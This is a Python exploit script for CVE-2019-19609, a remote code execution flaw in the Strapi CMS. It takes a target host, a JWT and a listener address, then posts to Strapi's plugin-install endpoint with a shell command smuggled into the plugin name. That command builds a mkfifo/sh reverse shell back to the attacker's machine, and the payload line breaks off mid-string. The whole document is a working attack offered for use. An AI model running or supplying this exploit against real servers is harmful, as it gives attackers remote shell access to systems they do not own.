import requests
import sys


print('''Strapi Remote Code Execution - CVE-2019-19609''')

if len(sys.argv) ==5:
    rhost = sys.argv[1]
    jwt = sys.argv[2]
    url = sys.argv[3]+'admin/plugins/install'
    lhost = sys.argv[4] 

    headers = {
        'Host': rhost,
        'Authorization': 'Bearer '+jwt,
        'Content-Type': 'application/json',
        'Content-Length': '155',
        'Connection': 'close',
    }

    data = '{ "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>>
    response = requests.post(url, headers=headers, data=data, verify=False)

else:
    print('\npython3 exploit.py <rhost> <jwt> <url> <lhost>')
    print("\ncheck your lhost and nc port")
